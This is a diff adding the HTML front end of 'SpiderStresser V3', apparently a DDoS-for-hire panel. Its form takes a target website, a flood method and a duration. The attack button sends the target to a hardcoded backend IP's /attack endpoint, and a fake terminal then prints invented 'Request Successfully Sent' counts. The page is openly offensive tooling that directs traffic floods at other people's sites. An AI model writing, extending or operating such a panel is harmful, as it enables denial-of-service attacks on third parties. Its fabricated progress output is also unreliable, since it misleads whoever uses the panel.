@@ -1,0 +1,207 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>SpiderStresser V3</title>
+  <style>
+    body {
+      margin: 0;
+      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+      background-color: #0d0d0d;
+      color: #ff1a1a;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: start;
+      min-height: 100vh;
+      padding-top: 40px;
+    }
+
+    h1 {
+      font-size: 2.8rem;
+      margin-bottom: 10px;
+      color: #ff1a1a;
+      text-shadow: 0 0 10px #ff0000;
+    }
+
+    .logo {
+      width: 150px;
+      height: 150px;
+      object-fit: contain;
+      margin-bottom: 25px;
+    }
+
+    .container {
+      background: #1a1a1a;
+      padding: 25px 30px;
+      border-radius: 10px;
+      box-shadow: 0 0 25px #ff000088;
+      max-width: 400px;
+      width: 100%;
+    }
+
+    label {
+      display: block;
+      margin: 10px 0 5px;
+      color: #fff;
+    }
+
+    input, select {
+      width: 100%;
+      padding: 10px;
+      border-radius: 5px;
+      border: none;
+      background: #330000;
+      color: #fff;
+      margin-bottom: 10px;
+    }
+
+    button {
+      background: #ff1a1a;
+      border: none;
+      padding: 12px;
+      width: 100%;
+      border-radius: 5px;
+      font-weight: bold;
+      font-size: 16px;
+      color: #fff;
+      box-shadow: 0 0 10px #ff0000aa;
+      cursor: pointer;
+      transition: 0.2s;
+    }
+
+    button:hover {
+      background: #cc0000;
+    }
+
+    .logout-btn {
+      position: absolute;
+      top: 20px;
+      right: 20px;
+      background: transparent;
+      border: 2px solid #ff1a1a;
+      color: #ff1a1a;
+      padding: 8px 14px;
+      border-radius: 6px;
+      font-weight: bold;
+      cursor: pointer;
+      transition: 0.3s;
+      box-shadow: 0 0 10px #ff000088;
+    }
+
+    .logout-btn:hover {
+      background: #ff1a1a;
+      color: black;
+    }
+
+    .terminal {
+      background: #1a0000;
+      color: #ff4d4d;
+      padding: 15px;
+      font-family: monospace;
+      font-size: 14px;
+      width: 90%;
+      max-width: 500px;
+      border-radius: 5px;
+      margin-top: 25px;
+      box-shadow: 0 0 10px #ff1a1a88 inset;
+      height: 200px;
+      overflow-y: auto;
+      display: none;
+      text-align: left;
+    }
+
+    .footer {
+      margin-top: 30px;
+      font-size: 12px;
+      color: #888;
+    }
+  </style>
+</head>
+<body>
+
+  <!-- Tombol Logout -->
+  <button class="logout-btn" onclick="logout()">Logout</button>
+
+  <h1>SpiderStresser V3</h1>
+  <img class="logo" src="https://files.catbox.moe/sbrorq.png" alt="SpiderStresser Logo">
+
+  <div class="container">
+    <form id="attackForm">
+      <label for="target">Target Website</label>
+      <input type="text" id="target" placeholder="https://example.com" required>
+
+      <label for="method">Method</label>
+      <select id="method" required>
+        <option value="">-- Pilih Metode --</option>
+        <option value="flood">Flood</option>
+        <option value="java">Java</option>
+      </select>
+
+      <label for="duration">Duration (seconds)</label>
+      <input type="number" id="duration" placeholder="Contoh: 60" required>
+
+      <button type="submit">ATTACK</button>
+    </form>
+  </div>
+
+  <div class="terminal" id="terminalBox"></div>
+
+  <div class="footer">
+    © 2025 SpiderStresser Team • Developer: @Mr_Raxor
+  </div>
+
+  <script>
+    const backendURL = "http://152.42.251.149:9412"; // Ganti dengan IP panel kamu
+
+    // ✅ Cek apakah user sudah login
+    if (localStorage.getItem("loggedIn") !== "true") {
+      window.location.href = "login.html";
+    }
+
+    function logout() {
+      localStorage.removeItem("loggedIn");
+      window.location.href = "login.html";
+    }
+
+    const form = document.getElementById('attackForm');
+    const terminal = document.getElementById('terminalBox');
+
+    form.addEventListener('submit', async (e) => {
+      e.preventDefault();
+
+      const target = document.getElementById('target').value;
+      const method = document.getElementById('method').value;
+      const duration = parseInt(document.getElementById('duration').value);
+
+      terminal.innerHTML = '';
+      terminal.style.display = 'block';
+
+      // Kirim ke backend
+      try {
+        await fetch(`${backendURL}/attack`, {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({ target, duration })
+        });
+      } catch {
+        terminal.innerHTML = '<p>⚠️ Error: Gagal kirim ke server!</p>';
+        return;
+      }
+
+      // Terminal simulasi serangan
+      let count = 1;
+      const interval = setInterval(() => {
+        const line = document.createElement('p');
+        line.textContent = `${count} Request Successfully Sent`;
+        terminal.appendChild(line);
+        terminal.scrollTop = terminal.scrollHeight;
+        if (count >= duration) clearInterval(interval);
+        count++;
+      }, 100); // Kecepatan 10x per detik
+    });
+  </script>
+
+</body>
+</html>
